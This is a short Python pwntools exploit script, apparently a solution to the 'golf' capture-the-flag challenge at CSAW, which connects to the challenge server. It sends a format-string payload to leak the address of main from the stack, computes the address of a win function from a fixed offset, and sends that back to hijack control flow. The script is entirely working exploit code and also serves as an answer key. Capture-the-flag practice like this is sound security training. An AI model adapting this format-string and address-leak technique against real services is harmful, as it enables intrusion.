from pwnlib.tubes.tube import tube
from pwnlib.tubes.remote import remote
from pwnlib.tubes.process import process
from pwnlib import gdb

#with process("./golf") as conn:
#with gdb.debug("./golf", api=True) as conn:
with remote("golfing.ctf.csaw.io", 9999) as conn:
    conn: tube

    print(conn.recvline())
    print(conn.recvuntil(b"name? "))

    # This address to main was lying around on the stack higher than the stack frame for main
    #main_addr_fmtstr_offset = (0x7ffeb9965478 - 0x7ffeb9964f40) // 8 + 6
    main_addr_fmtstr_offset = (0x7ffeb9965478 - 0x7ffeb9964f40) // 8 + 4 # +4 is correct offset when connecting to server for some reason
    fmtstr_payload = f"%{main_addr_fmtstr_offset}$llx"
    conn.sendline(fmtstr_payload.encode())

    line = conn.recvline()
    print(line)
    line = line[len("hello: ") : ]
    main_addr = int(line, 16)
    print(f"main_addr {hex(main_addr)}")

    print(conn.recvuntil(b"aim at!: "))
    main_to_win_offset = 0x5e3ee7e31209 - 0x5e3ee7e31223
    win_addr = main_addr + main_to_win_offset
    print(f"win_addr {hex(win_addr)}")
    win_addr_input = hex(win_addr)[2:].encode()
    conn.sendline(win_addr_input)

    conn.interactive()
